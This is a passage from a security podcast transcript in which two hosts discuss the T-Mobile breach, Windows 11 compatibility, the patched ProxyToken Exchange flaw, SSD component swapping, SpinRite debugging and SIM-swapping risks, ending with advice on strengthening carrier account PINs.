STEVE:  There was no protection.  You know, I'm good, but I'm not that good.  Anyway, the router reportedly had a different configuration from T-Mobile's other public routers.  Again, we don't know what that means exactly.  The details are still scarce.  But from that router, John said that he managed to then break into T-Mobile's large datacenter located in East Wenatchee, Washington.  And then inside the Wenatchee facility, John said he had access to more than 100 servers containing the personal data of millions.  By August 4th he had exfiltrated millions - now, the reporting said "files."  I assume that means "records," so probably fewer files.  Millions of somethings, records - thanks to what he told the Journal was the mobile phone seller's pathetic security.



Note also that the company that's big on magenta, but apparently not so big on cybersecurity, never had any idea that he was loose inside their network, roaming around freely at will.  Independent observers within the cybersecurity community noted that the fact that the theft included records from prospective clients as well as former, long-gone customers, demonstrates the extreme degree to which no one inside T-Mobile was practicing any data management hygiene.  It's like they just weren't bothering to delete old cruft.  It was taking up space; but of course storage is cheap now, so why delete it?  Well, why indeed?



And I'll add that the data John was able to make off with was not encrypted.  That sort of sensitive data at rest should be encrypted so that only the system that's validly retrieving it for its proper business purpose should then be able to decrypt and read it.  But the files themselves should never be stored in simple exportable and readable plaintext.  But T-Mobile's was.



So when you consider a publicly exposed router that can be broken into, apparently no network intrusion monitoring and response - because they never knew - and a complete lack of long-term data management and policy, the fact that this is the sixth such data breach in just the past few years should not be surprising.



As we've discussed before, I've always taken the position that the person in charge should not necessarily be fired when something bad happens on their watch because those can be teachable moments, vivid teachable moments, and the result might be much improved security in the future.  But now I'm not so sure.  T-Mobile is making me rethink the beneficent tolerance approach to employee management.  Maybe it's time for some heads to roll because they don't - no one seems to be getting the message; right?  It's just like it hasn't been fixed in years.



They did say, I mean, there's a lot of CYA going on now, and mea culpas, and the president saying, oh, no, we've - I think he said they hired Mandiant and KPMG to come in.  Mostly I'm sure it's to salve Congress, and there is a class-action lawsuit that has already been launched, of course, and blah blah blah.  So something has to happen to make these guys take this more seriously because it doesn't seem that six data breaches in half that many years has been enough to make that happen.



Okay.  So where will Windows 11 run, Leo?  At the moment, no one seems to be sure, and Microsoft is not helping.  The best advice I have is to take the time to check in with the maker of your machine, motherboard, or whatever to see whether they're offering any updates to increase compatibility with Windows 11.  We noted two weeks ago that Asus had deliberately updated the firmware of 207 of their motherboards specifically to ease their users' move to Windows 11.  Bravo.  So it's worth checking to see whether whatever system you're using might have some similar updates available for it.



Unfortunately, Microsoft continues to confuse.  They appear to be holding onto their baseless "must have TPM v2.0" requirement, even though Windows 10 has no such need. And we hear that they're gradually adding older Intel chips to the approved list.  But Intel chips are famously backwards compatible.  So I'm at a loss to understand what's really going on there, since no one imagines that Windows 11 is really so different from Windows 10.



LEO:  Just to add some fuel to this fire, they did a briefing with Tom Warren at The Verge and said, you know, you can install Windows 11 on any of the machines that we say are incompatible, but you just have to download the ISO and install it.  And we're not going to really support it, but it'll work.  So we know it'll work.  



STEVE:  Yeah, yeah.



LEO:  So that just shows you this is some sort of marketing thing they're up to.  There's not - no technical reason for it.



STEVE:  Well, yes.  And I'm going to give them a dose of 'tude here in a minute, how I feel about this.  They just added the Intel Core X-series, the Xeon W-series, and the Intel Core 7820HQ chips.  Just, you know, why not?  However, they did state that no AMD Zen 1 processors would be compatible.  So there.



Now, when you look back at the history of Microsoft's major version upgrades for Windows, the jumps from, for example, NT to 2000, 2000 to XP, XP to Win7, Win7 to Win8, and Win8 to Win10 have all brought actual substantive changes.  But this current move from 10 to 11 doesn't have that feeling at all.  You know, rounded corners, ooh.  Going to change the alignment of the Start Menu.  So it's difficult to understand why Windows 11 cannot simply run everywhere Win10 does.  And Leo, as you just said, it kind of does.  Unless Microsoft for some reason just doesn't want Windows 11 to run everywhere.  But that will create exactly the sort of stratification that Microsoft worked so hard to avoid when they attempted to force everyone to move to Windows 10 whether they wanted to or not.



Now, apparently Microsoft will be attempting to resolve some of this confusion by adding a "Windows 11 compatible" message to the Windows Update screen.  I have a snapshot of one of those in the show notes.  And over on the right you can see where it says, with a green checkmark, "This PC can run Windows 11."  And it says:  "Great news.  Your PC meets the minimum system requirements for Windows 11."  Then it says:  "Specific timing for when it will be offered can vary as we get it ready for you."  Okay.  But "Specific timing for when it will be offered can vary as we get it ready for you"?  What the hell does that mean?  Really.  We're really not sure when Windows 11 will be ready to run on your machine, despite the fact that we're announcing here the good news that your machine will be able to run it, just not when.



So somehow Microsoft appears to have succeeded at completely removing all of the science from computer science.  So now it's, well, no one around here who we've been asking seems to be completely certain about when exactly this next big release of Windows 11 may be ready for your particular machine because we haven't really figured out what we're going to do yet.  Yeah.  Wake me up when you have figured this out.  I can't wait.



LEO:  What if the real reason for this is not technical at all?  Well, I mean, we know the real reason for it is to sell new PCs in the fall.



STEVE:  You think?  You think?



LEO:  But what if the real reason is they want, look, they want, I mean, we know this backward compatibility is actually a source of security problems.  



STEVE:  It is.



LEO:  So what if what really they're trying to do is, admittedly, they're forking the road, but saying, you know, we want to get the most possible people in a more secure environment, TPM eighth generation or later.  Is the eighth generation or later susceptible to Spectre and Meltdown?  Or does that not come into this?



STEVE:  Yeah, I mean, everything kind of still is.



LEO:  They all are, yeah.



STEVE:  Yeah.  And BIOSes have been updated in the past.  I mean, they could say something like you must have an updated chip that isn't.  But remember they're the ones who are updating the firmware.  Windows provides that on-the-fly patch of the chip.  So it knows what it's doing.  I mean, it really...



LEO:  They're just trying to make a more secure ecosystem.  What if that's the reason?  We'd be for that; right?  



STEVE:  Actually, their problems, I mean, all the problems we talk about, they don't surround chip architecture.



LEO:  Right.



STEVE:  As we know...



LEO:  It's Microsoft.



STEVE:  Yes.  As much noise as was made about Spectre and Meltdown, there was never even one instance of it being a problem.  Yet Exchange Server looks like Swiss cheese. 



LEO:  Right.



STEVE:  So, you know, and I heard you and Paul and Mary Jo talking about this.  I mean, what they would like to do is stop supporting their older legacy stuff.  For example, 32-bit support is finally disappearing; right?  So that should help a lot.  



LEO:  That will help a lot, yeah.  The Win32 subsystem is a big problem.  



STEVE:  So I could see saying, okay, if your chip can't, you know, if you were running Windows 1032, sorry, use that for something else.  And that's just too far old.  But what is really infuriating people, and again, the muddle of this, the lack of, well, maybe.  And, oh, if you downloaded the ISO, gee, it'll run.  But we'll be less excited about it.  What?  Oh, and Leo, I'm not kidding you, just an hour ago when I booted the Win10 machine that's right up here, it's the one I'm looking at that all I use it for is connecting to TWiT for this podcast, none of its desktop icons appeared.  And the onscreen clock that auto starts wasn't there.



LEO:  Oh, boy.



STEVE:  But this is Win10; right?  Where all of the science has been removed.  So I just shrugged and restarted.



LEO:  It worked.



STEVE:  And the second time Windows felt - it felt more like finishing up.  So it was in a good mood.  It was a little warmer, maybe.  I got all of my desktop icons back, and everything appears to be present and accounted for.  And I can't wait to see what Windows 11 has in store for us.



LEO:  The more I use Windows, the more I love Linux.  That's all I'm saying.



STEVE:  Yeah.  First we had - and I'm going to turn this down.



LEO:  You're selling a lot of - he's selling a lot of SpinRites these days.  That's good.



STEVE:  First we had ProxyLogon, the original mess with Microsoft Exchange Server, that they didn't patch until its use in active attacks had become public.  Then, last week, we discussed ProxyLogon's kissing cousin ProxyShell, similar but different.  And today we have what's being called ProxyToken as Exchange Server's latest to become public vulnerability.  It was finally patched after more than three months in July, with July's Patch Tuesday last month.



Microsoft was originally informed of this vulnerability through the Zero-Day Initiative (ZDI) by a Vietnamese security researcher on April 5th of this year.  So, yes, a little more than three months for them to patch it.  Maybe it's just that - I don't know. 



LEO:  It's hard to think of a good reason; isn't it.



STEVE:  When you remove the science from computer science, what you get is, you know...



LEO:  It's just a computer.



STEVE:  The ProxyToken vulnerability would, for example - that's today's latest - allow an attacker to surreptitiously add an email forwarding rule to a user's mailbox.



LEO:  Oh, man.



STEVE:  So that all emails addressed to that victim would also be sent to an account controlled by the attacker.  How convenient.  The vulnerability essentially allows a remote attacker to bypass authentication and make changes to an Exchange email server's backend configuration.  The flaw was reported, as I said, through the ZDI, the Zero-Day Initiative program, and it exists due to a pair of problems in the Exchange code.  Two of them.  First, requests that contain a non-empty cookie named "SecurityToken" that are redirected from the frontend to the backend are not authenticated because, after all, it has a security token, even if it's bogus; right?  It's non-empty.  So basically the attacker just adds a cookie called "SecurityToken" to their query headers, and you bypass all authentication.  Second, HTTP 500 error responses expose an Exchange control panel canary token.



Combining these two oversights, its discoverer explained that a so-called ProxyToken - because it uses cookies - attack is possible, and that attackers can easily make requests to any part of the Exchange backend, including its users' control panels and settings.  And since the details of this attack went live yesterday on the Zero-Day Initiative blog - after all, they waited more than, wow, like a month and a half since July's Patch Tuesday, which is when this was fixed - server owners should expect threat actors to weaponize this vector.



And weaponizing the vector is exactly what we saw happen last month when attacks against Exchange servers took off after the details about the ProxyShell vulnerability were first published online.  Remember that's where what's-his-name, Orange Tsai, gave his speech at Black Hat, and he said just enough for some clever people to further reverse engineer what he hadn't said, and then the exploit went public, and within a day or two it was being used.  And it's now being used by this LockFile ransomware to get into people who still for whatever reason, those what is it, 1,500, or was it thousand, Exchange servers which still haven't been updated.  So presumably they still have - they haven't updated to the ProxyToken attack, and so have at it, everyone.



I put this under Errata, not because it really was, but just because it sort of fits there.  I received a DM tweet from a listener who wrote:  "Hi, Steve.  Maybe I missed it, but Tailscale is open source."  And he provided a link to Tailscale on GitHub where, sure enough, they have an account.  And it's true that much, though not all, of Tailscale is open source.  I'm mentioning it because our listeners have just gone nuts over it.  Tailscale explains:  "This repository contains all the open source Tailscale client code and the tailscaled daemon and tailscale [command line interface], the CLI tool.  The tailscaled daemon runs primarily on Linux.  It also works to varying degrees on FreeBSD, OpenBSD, Darwin, and Windows."



They provide a link to their Tailscale for Android client.  And for non-Android Tailscale clients they write:  "The macOS, iOS, and Windows clients use the code in this repository, but additionally include small GUI wrappers that are not open source."



LEO:  Stay away from small GUI wrappers, that's all I'm saying.



STEVE:  Yeah.  You want to - yeah, exactly.  Or bring some paper towels.  So just to be clear, I have not yet dug into any of this.  But it does look as though someone who wanted to take more responsibility for setting things up with the code that Tailscale has developed and is open source, who wanted to roll their own solution, could definitely do that using the open source code provided within Tailscale's repository.



And it sounds very much as though you'd want to be using a Linux box to run the tailscaled daemon, though presumably such users would then also be responsible for keeping those things up to date, which Tailscale would normally be doing for you if you were coming through their front door and using their regular service, which I imagine all of our listeners have done.  Remember that it gives you up to 20 different endpoints that you're able to use in their free offering.  Tailscale provides links to both their stable and unstable package builds.  They support a vast array of Linuxes and also a Windows installer.  So anyway, I wanted to give the Tailscale folks credit for and to acknowledge the open source aspects of their offerings.



And also there's been a lot of discussion of this in GRC's newsgroups, and I thought it was just worth putting it on our listeners' radar because I know our listeners will care.  Both Tom's hardware and ExtremeTech have been following the growing controversy over the practice that's been discovered among an increasing number of SSD makers who have been caught initially releasing a new high-quality product for review and analysis by the tech publications and presumably by their large OEMs for subsequent inclusion in future systems and then, once that's been done, quietly replacing their initial fast and high-quality semiconductors with significantly lower cost and lower performance components while not changing the device's part number to make this apparent in any way.



I didn't have it in the show notes.  But for example, in some cases they are changing the use of TLD to QLD chips going from three-layer to quad-layer, which is of much lower - it's a higher density, but lower cost and lower performance chip replacement.  I mean, universally agreed. 



What this means for us is that the important and typically carefully considered opinions of the reviewers of these products may not actually be reflective of the devices that we eventually purchase after relying upon such reviews.  And it also means that tremendous commercial pressure is then placed upon those unfortunately fewer and fewer companies who are resisting this fraudulent bait-and-switch behavior.  Though this is off topic for the podcast, I obviously have a huge personal interest in the whole topic of mass storage and its performance, reliability, and recoverability.  And I know our more tech-savvy listeners do, too.



A few weeks ago, on August 16th, ExtremeTech's Joel Hruska (H-R-U-S-K-A) posted a piece titled "Buyer Beware: Crucial Swaps P2 SSD's TLC NAND for Slower Chips."  I have a link in the show notes for anyone who wants to read the whole thing.  He started off by saying:  "Crucial has come under fire after a retest of its well-reviewed P2 SSD demonstrated that the company has swapped from its launch design to a much inferior product.  This is not the first time SSD manufacturers have been caught bait-and-switching customers in this fashion, and it's deeply frustrating to see companies willing to subvert their own review process.



"The scheme goes like this:  Sample an SSD out to reviewers and spec it reasonably well.  Once all the reviews are in, swap out the components for inferior products that are not as power-efficient and/or do not offer the same performance.  That's what Tom's Hardware found when it investigated Crucial's P2 NVMe M.2 SSD after reviewing the initial part shipped by Crucial.  Crucial has swapped the TLC NAND it originally shipped with QLC NAND, and not terribly good QLC NAND, at that.  The new version of the P2 has two fewer NAND chip packages than the original, and significantly fewer total dies.  This reduces the total potential bandwidth the SSD controller can achieve and further harms the performance of the 500GB drive.  The average power consumption on the QLC drive is lower, at 1.49 watts, but total power efficiency is actually worse because the savings do not make up for the dramatically slower performance.  If full drive performance on the P2 was already bad, it's downright abysmal on the P2 with QLC NAND."



So that was on the 16th.  Exactly a week ago, on August 24th, Joel followed up that piece with another titled "Western Digital Caught Bait-and-Switching Customers with Slow SSDs."  Again, the link in the show notes.  He said:  "When I wrote about Crucial's decision to swap inferior NAND flash into its products without updating the reviewer community or announcing a separate SKU, I noted the problem was a one-off.  While this has happened before, it's typically been the exception, not the norm.  Guess that was too much to hope for.



"According to a report from Chinese tech site Expreview, the WD SN550 Blue, which is currently one of the best-reviewed budget SSDs on the market, has undergone a NAND lobotomy.  While the new SSD variant performs on par with the old drive that WD actually sampled for review, once you exhaust the SLC, that is to say single-level cache, NAND cache, performance craters from 610MB/s as measured by THG to 390MB/s as measured by Expreview.  The new drive offers just 64 percent of the performance of the old drive.  This is unacceptable.  It is unethical for any company to sample and launch a product to strong reviews, only to turn around and sell an inferior version of that hardware at a later date without changing the product SKU or telling customers that they're buying garbage."  His words. 



He says:  "I do not use the term 'garbage' lightly, but let me be clear.  If you silently change the hardware components you use in a way that makes your product lose performance, and you do not disclose that information prominently to the customer, ideally through a separate SKU, you are selling garbage.  There's nothing wrong with selling a slower SSD at a good price, and there's nothing right about abusing the goodwill of reviewers and enthusiasts to kick bad hardware out the door."



And sadly, Joel followed this with his latest review in this series just last Friday the 27th by posting:  "Samsung Is the Latest SSD Manufacturer Caught Cheating Its Customers."  He said:  "In the past 11 days, both Crucial and Western Digital have been caught swapping the TLC NAND used for certain products with inferior QLC NAND without updating product SKUs or informing reviewers that this change was happening.  Shipping one product to reviewers and a different product to consumers is unacceptable, and we recently recommended that readers buy SSDs from Samsung or Intel in lieu of Western Digital or Crucial.



"As of today, we have to take Samsung off that list.  One difference in this situation is that Samsung isn't swapping TLC for QLC.  It's swapping the drive controller and TLC for a different, inferior drive controller and different TLC.  The net effect is still a steep performance decline in certain tests.  We've asked Intel to specifically confirm it does not engage in this kind of consumer-hostile behavior and will report back if it does."



So Joel's post goes on to show photos of the peeled-off top label of a Samsung 970 EVO Plus SSD to reveal very different chips underneath the label.  And of course there's no problem with them doing that.  They're free to put whatever chip they like on their products.  But if that's done after the drives have been reviewed to shave their cost and the users' performance, I agree with Joel that's not okay.



LEO:  Is it possible it's chip shortages?



STEVE:  That's - yes.



LEO:  I mean, they should certainly disclose.



STEVE:  They may have exactly that, you know, like have no choice.  But they would have to then suspend that part and just say, sorry, this part is temporarily not available.  Here's the best one we have to offer.  And just to put a bow on this, Western Digital said:  "In June of 2021 we replaced the NAND in the WD Blue SN550 NVMe SSD and updated the firmware."  So that confirms that an undocumented parts change they made was responsible for this 50% reduction in writing performance.  They said:  "At the time, we updated the product data sheet.  For greater transparency going forward, if we make a change to an existing internal SSD, we commit to introducing a new model number whenever any related published specifications are impacted."  So they didn't say when the performance changes, but they did say when any related published specifications are impacted.  So that's something.



Anyway, I wanted to put this on everyone's radar to make sure that our listeners knew that this was apparently going on within the industry.  As you noted, Leo, there is a chip shortage which is impacting all kinds of things, threatening maybe to raise prices somewhat, just due to a price increase all the way back at the fab sellers end.  Everyone knows that I believe in benchmarks and in performance testing.  GRC's DNS Benchmark has become the industry standard tool, with more now than seven million downloads of that little puppy.  And the first thing I did, as our listeners know, with SpinRite's new driver technology was to create the ReadSpeed drive benchmark.  One of the things we immediately learned was that there were some very weird things going on inside our SSDs.  They do not behave at all like the solid-state RAM we wish they were.  Now is not the time for me to dig into those particular weeds.  But everyone can rest assured that this has my attention, and that a future SpinRite is going to be quite revealing.



LEO:  Oh, good.



STEVE:  Yeah.  And speaking of SpinRite, after an unusually long code-writing stint without doing any testing, I recently switched back to testing and debugging all of the new code I've been writing.  Since writing in assembler allows me to reassemble and link my code in less than half a second, the cost to rebuild my entire project is like zero.  And in fact I use that to check for typos on the fly.  So the rhythm that's developed for me over the years is, I guess I would call it "fast iteration," where I'll write a chunk of code, then stop right then to immediately test it to verify that it does what I expect and need.  Then I'll move forward knowing that what I've left behind is at least mostly ready for the world.  Then I'll move on to the next stage.  So this creates a solid foundation for whatever follows.



But I had stopped working that way when I began the rework of SpinRite's device driver model to "abstract" all of SpinRite's drive interaction behind a single custom I/O function.  I talked about that a month or so ago.  I stopped iterating because for a long time I haven't been able to.  I needed to pretty much take SpinRite down for that rework and just hold my breath while I reassembled it in this new very different way.  Then once it was back up, I thought that I should just keep pushing forward rewriting the code that would then use the new I/O abstraction system.



I did enough of that to see that my first design needed a bit of tweaking, as I mentioned on the podcast at the time.  And that regarded SpinRite's handling of the drive's built-in error correction, which I realized should have been transparent at the abstraction layer since there's no reason to return an unfinished request to our caller if we've been able to autonomously correct and obtain the data for the user.  So I reworked the five different drive interfaces to autonomously handle their drivers' reports of corrected errors, essentially eliminating that as a possible cause for returning early, and it's just handled by the driver.



But what wasn't sitting well was that I had written so much code that hadn't had any testing.  So last week I decided to stop writing and to switch back to testing and debugging.  And I have to say I've been having a wonderful time verifying expected behavior, when everything works as I designed, and tracking down the causes of unexpected mysteries when things don't work as I expect.



LEO:  You're one of the few people who loves debugging.



STEVE:  Oh.  It just...



LEO:  It's fun, though; isn't it.  If it works, if you solve it, it's a great feeling.



STEVE:  Well, yeah.  And I've been coding for so long that I'm not afraid of debugging.



LEO:  Right.  You know, right.



STEVE:  It's not like something's going to get me.



LEO:  Right.



STEVE:  I'm going to get it.  But, I mean, I'm really intrigued when it's like, okay, why?  



LEO:  Why doesn't that work?  Yeah.



STEVE:  What happened?  Yeah.  And as I've often said on the podcast, whenever I find a mistake, I don't try to sweep it under the rug.  I stop.  I cross my arms, and I think, okay, how did that happen?  What went wrong that caused me to do that?  And so I always take it, like I said of IT managers who don't seem to learn from their mistakes, for me it's a teachable moment.  So in fact I posted over in GRC's spinrite.dev newsgroup last week that I realized I could easily be pulling all-nighters because chasing down these little mysteries, it was so much fun and was so compelling.  And I never want to stop; right?  It's like, okay, I'm looking at the clock, and it's getting to be later, and Lorrie is, like, infinitely patient.  She's just there with her headphones on.  We have a Roku remote that has that headphone jack.  So she's able, she's actually watching "The X Files" for the first time.



LEO:  Oh, that's awesome.



STEVE:  Having a wonderful time.



LEO:  That headphone jack is great; isn't it?  Because you can be in the same room, but she doesn't have to bug you and vice versa.  That's, I agree, yeah.



STEVE:  Yeah.



LEO:  What do you use to debug?  You use GDB, or is there some tool that you use, or you step through...



STEVE:  Oh, no, I'm in DOS.



LEO:  You can't do print statements in assembly.



STEVE:  No.  And in fact I spent a lot of time essentially coming up with a debugging environment which would work because what I had been using was a great tool called SoftICE.



LEO:  Oh, yeah.



STEVE:  Which was - it ran as a DOS memory manager.  So it put the system into protected mode.  And then so it used that to hide itself.  And also being in protected mode it was able to hook all the things that it needed to in order to get control.  So it was sort of a hypervisor for DOS.  And it took up no conventional memory because it was able to live itself up in extended memory.  But the problem is, SpinRite has become its own memory manager.  It runs the chip in real mode so that it can have DOS, and then it plays a game.  It briefly switches into protected mode, and it uses what is apparently a bug from the very first 286 chips where, if you switch into protected mode and change the protected mode descriptors, and then you switch back into real mode, the descriptor cache is not flushed.



LEO:  Ah, good.



STEVE:  They miss that.



LEO:  So you can examine the state of your program.



STEVE:  Well, actually what happens is, when I'm in protected mode, I set the - normally real mode descriptors are 64K because that's - a real mode segment is 64K.  But that's in the chips that allow protected mode, which is to say anything from a 286 on, that's just a register.  Basically, in real mode, the chip is pretending to be in real mode.  It's not actually in real mode.  Real mode is faked by setting up a kind of a - by setting up the segmentation registers to have the same limitations that they originally had in real mode, when you just had an 8080 and an 8086.  So what happens is SpinRite briefly switches to protected mode, sets the segment extents, which are 32 bits, to 4GB, and then switches back.  So now what I have, because the chip forgets to flush the cache of the segment descriptors, is I have segments that are actually flat.  That is, they're actually 4GB segments.



LEO:  Oh, wow.



STEVE:  Not 64K segments.



LEO:  Wow.



STEVE:  Which allows me to access all of the system's RAM from real mode.  So it is a hack, but it's a hack that a lot of the gamers use, the DOS gamers all did this, and it's known as long real mode or flat real mode.  And so I added that capability to SpinRite.  But that made it incompatible with SoftICE.  So what that meant was I had to go back, I had to fall back to an earlier debugger known as Periscope.  Periscope was written by an old buddy of mine, I mean, because, you know, back in those early DOS days we all knew each other.  I knew Bob Smith, who did Qualitas and 386MAX that was the memory manager.



LEO:  Remember that, yeah.



STEVE:  And Brett Salter wrote Periscope.  And unfortunately Brett died about four years ago, or I would have had him make some adjustments to Periscope for me.  But I can't do that.  So Periscope only runs in conventional memory.  And it takes up a lot of conventional memory.  So, in fact, just the other day I had to - or actually two days ago I posted in the GRC SpinRite dev group that I'd had to move the 4,000-byte screen capture from - when you start SpinRite, it sort of takes over the whole screen.  It's a full screen kind of text GUI.  And when you exit SpinRite, it wipes that off the screen, returning you to the screen you had before.  Well, that requires saving the screen you had before.



Well, that was taking up 4,000 bytes, and I had run out of conventional memory.  So two days ago I moved that save buffer into extended memory.  You know, it was easy to do.  Just change some pointers around for the copy, the screen copy.  But the point is I am at the point where I no longer have any conventional memory room.  So but the good news is I pretty much have all of the code written, and now I'm in a debugging and testing mode.  I did note in my posting when I said that I was having a hard time quitting at the end of the day, and Lorrie was being very patient with me, but I had learned the hard way that I am no longer coding as a teenager.  And that if I do, in fact, pull an all-nighter, I end up giving back all of that time.



LEO:  Exactly. 



STEVE:  That I thought I was saving.  



LEO:  Because the next day is shot.



STEVE:  The next day, exactly.  I am useless.  I'm drooling.  I'm just, what?  Huh, what, honey?  Anyway, so I don't do that now.



LEO:  The folks at Big Nerd Ranch in one of their books say caffeine is not a substitute for sleep.  Get a good night's sleep.



STEVE:  Anyway, overall it's all really going well.  



LEO:  Somebody asked me this before.  So there's a style of coding that's in vogue these days, I actually use it and really like it, called "test-driven development," where you write tests for modules, and the module isn't completed till it satisfies the test.  And you try to write tests that - you don't do that.



STEVE:  If I had the time, I would love to.  What that does is it allows you to prevent making regression errors.



LEO:  Exactly.



STEVE:  And that's exactly what happened is that...



LEO:  It's more useful in functional programming because you can say this is provably, because there's no mutability, it's probably going to work every time with the same input, same output, so you can test it.



STEVE:  Yes.  Yes.



LEO:  So it works very nicely there.



STEVE:  Being able to complement code you write with test code for what you write, it is invaluable.  It's a little difficult because what I'm doing is all about interacting with actual hardware.



LEO:  So it's all mutable, really.  That's the problem.



STEVE:  Yeah.  And the routines are testing against hardware function and their interaction with it, rather than just sort of like, wow, did I get, you know, did it actually produce a Fibonacci series or not?



LEO:  Right, right, right, exactly, yeah.



STEVE:  So it's not something like that.  But anyway, I am really happy with the way it's going.  I didn't foresee the path that I'd be taking when I began.  But I'm very pleased with all the decisions I've been making up to this point.  And although the outside of SpinRite will reveal some signs of an entirely new SpinRite underneath, which is actually what has happened, it will largely look the same.  It will be blazingly fast and will work on drives of any possible sector count.  And thanks to its new I/O abstraction model which is underneath, it will also be ready to graciously accept the native USB and NVMe support that will be added after the move off of DOS so that we're able to boot on newer systems that have removed support for the BIOS, and thus DOS, and only boot UEFI-based operating system code.  So anyway, I'm getting there.  I'm in debugging mode.  I actually stopped Sunday night with a mystery that I can't wait to get back to this evening.  So, yeah, I'm having a great time.



LEO:  He doesn't watch mysteries on TV, folks.  He creates his own and solves them himself.



STEVE:  Yes, while Lorrie loves learning about Sculler and Muldy, I mean, Mulder and Scully.  And she's not seen the two movies, and so I am going to watch those two feature-length movies with her.



LEO:  Fun, fun.  



STEVE:  It's going to be fun.



LEO:  Yeah.



STEVE:  And it's water time.



LEO:  Beverage time.



STEVE:  And then we're going to talk about how our lives are hanging by a PIN.



LEO:  Oh.  I know this, too.



STEVE:  Okay.  So the subtopic - wow.  I thought I...



LEO:  You didn't fix it yet.  Not fully moistened.  Moisten.



STEVE:  The subtopic for today's podcast would be our cellular phones as a critical weakest link in the chain.  In addition to the best general purpose advice I give to everyone, which is to operate your life with your credit reporting frozen at all four of the credit reporting bureaus, after this breach T-Mobile subscribers especially should be sure to change their account PINs; and, when doing so, to make their new PIN as long and complex as possible, if there's any latitude there within the limitations of a PIN, and to use digits having the highest possible entropy that have nothing to do with their life.



Never use any date of significance or anything that someone who knows you might guess, since a determined attacker might have been able to gather sufficient information to effectively know you.  Since the PIN was one of the items of information stolen that's under a subscriber's control, and since it's crucial for verifying your identity to your cellular carrier, it really must be changed.



All of the various cellular carriers now offer some form of SIM-jacking protection.  This is also known as "SIM-swapping" or "port-out scamming."  It occurs when a scammer contacts your cellular provider and pretends to be you.  The trouble is, in the case of T-Mobile, a scammer will be armed with everything T-Mobile knows about you, including the account PIN that was stolen.  I'll come back and talk about this SIM-jacking in a minute.



I recently set up a new phone with my provider, Verizon.  I think I mentioned it on the air.  The battery of my beloved iPhone 10, which I'd owned for years, had outgassed and ballooned, popping the screen out and causing it to bend alarmingly.  This was actually the second time that had happened with this phone, so I had Apple replace the battery to create a hand-me-down, having decided that it was time to move to an iPhone 12.  So that I wouldn't be without a phone during the repair, I first purchased the new 12 and had Apple deliver it using their incredible "by the way, that's us knocking at your front door with your new phone" service.  It literally took about an hour to have the new phone delivered and in my hand.  So that process was painless.



But today, thinking back over just how painless the process was, in the context of the T-Mobile breach, I realized that it was a terrifyingly simple thing for me to move my cellular service over to the new phone.  The only thing Verizon needed from me that wasn't otherwise generally available public knowledge, was my account PIN which, yes, was also part, as I've said now several times, of the T-Mobile data breach.  That PIN was effectively my entire proof of identity.  They didn't need email, nor for me to first respond through the previous phone, which I had already decommissioned.  And if the phone was claiming to be dead, lost, or stolen, they still need to be able to move forward.



So everything boils down to your account PIN.  I simply provided those few digits of my PIN, which they confirmed matched the one they had on file.  Then I read off long strings of numbers - my new phone's ICCID and IMEI, which as I said I'll talk about in a second.  And just like that, my new phone was live with my phone number.  And I didn't think twice about it.  It's like, okay, cool.  Thank goodness that wasn't harder.



But once a bad guy has taken over your phone number, your actual phone will lose service.  That's your first clue that life is about to become much more complicated, and not in a good way.  Naturally, any of your online services that still rely upon SMS text messages sent to your registered-with-them phone number, or can somehow be made to rely upon sending a text message, will immediately be subject to compromise and takeover.  Your email provider cannot send you an account recovery email if you claim to have forgotten your email account password.  So they'll have your phone number on file in order to send a text message to your phone for emergency account recovery.  And those of us who have a Gmail address know that Google, for example, is pretty good about prompting us from time to time to make sure our phone number with them is still current and correct.  Guess why?  So they can recover accounts from forgotten email passwords.



But now the attacker who used your PIN to impersonate you to your cell provider to get your phone number moved over to his phone will receive that emergency account recovery text after claiming to have forgotten your email logon password.  And the first thing they'll do will be to change your email password in case the account recovery process itself didn't automatically change it for them.  Now you're locked out of your own email.  So next they'll start accessing your various services, clicking on the "oh my, I forgot my password" link, and thus obtaining access to any of your accounts when that account recovery link is sent to your email, which they now control.



In fact, if your password manager provides email or SMS-based account recovery, your attacker can go right to the source, obtaining your entire master password archive to learn not only every account name and password, but also everywhere you have accounts, and your username and password manager will log them right on.  Or if you've decided to simply have your browser memorize your logons, they can now log on as you on the same make and model of browser you use, have that browser synchronize all of its settings and history and shortcuts and passwords, then browse though its long list of saved usernames and passwords for everywhere you have accounts.



It really is a nightmare scenario.  And this entire cascade of events is only prevented by someone with ill intent not knowing your incredibly weak, short, decimal four-digit PIN, which probably is currently your birthday or year of birth or anniversary date or street address number.  Because, after all, you wouldn't want to forget it.  We're dealing with cellular phones that are also being used by those who have no regard for security.  So the security of the entire system has been reduced to serve the lowest common denominator user.  Unfortunately, because an SMS-enabled cellular phone is also the one thing that everyone now has, this weakest link has also evolved to become our universal identity verifier.  And it deserves no such respect.



I went over to Verizon's FAQ page about PINS.  There, Q&A question #1 is:  "What's an account PIN, and why do I need one?"  And they provide the answer:  "Having a PIN helps to keep your Verizon mobile account and personal information secure."  They said:  "It's the primary way we verify you as the account owner when you contact customer service."  And then it goes on to explain:  "If you don't have an account PIN when you contact customer service for account changes or information, you'll be asked to create one to continue."



So take a moment to think about this single-point-of-failure vulnerability, and the cascade of disaster that flows from someone who's somehow able to obtain access to your phone number.  I just changed my PIN at Verizon - I really just did this morning - because this has all made me realize that I haven't been taking the lack of security of my cellular phone account PIN seriously enough.  And I'm using LastPass.  I also just removed my phone from LastPass's SMS account recovery where I did have it configured because, hey, extra security backup.  Right?  Wrong.



There are times when convenience can create convenience for the wrong person.  I will gladly take responsibility for never forgetting my master LastPass password.  Actually, I can't forget it because I've never known it.  It's a bizarre string of nonsense that is carefully written down and stored offline.  And that highlights my point.  The weakest link in the chain protecting my master password vault is not my insanely long password.  It's the fact that I had deliberately established a weak SMS-based backdoor into my account protected by a four decimal digit PIN and interactions with a very non-native English speaker, who claims her name is Nancy.



LEO:  Everyone knew her as Nancy, of course.



STEVE:  So, yeah.  If you're a T-Mobile subscriber, oh my god, change your PIN immediately.



LEO:  You know, just looking at mine, I made it 15 digits thanks to you, which is the longest they allow.  They only allow digits, alas.  But then they have security questions.  Which I think is the worst possible way to validate your identity.



STEVE:  Yup.  Again, somebody who knows you, who looks up your Facebook screen or your Twitter...



LEO:  It's on Wikipedia, yeah.  Yes.



STEVE:  Yes.



LEO:  So I use nonsense answers.  And they do now allow Google Authenticator.  But there's a default off switch on requiring two-factor.  So I've turned that on.  But those security questions, those are the weak link, unfortunately.



STEVE:  And so, you know, if by some chance you never bothered to assign a PIN to your cellular account...



LEO:  It wasn't necessary at first.



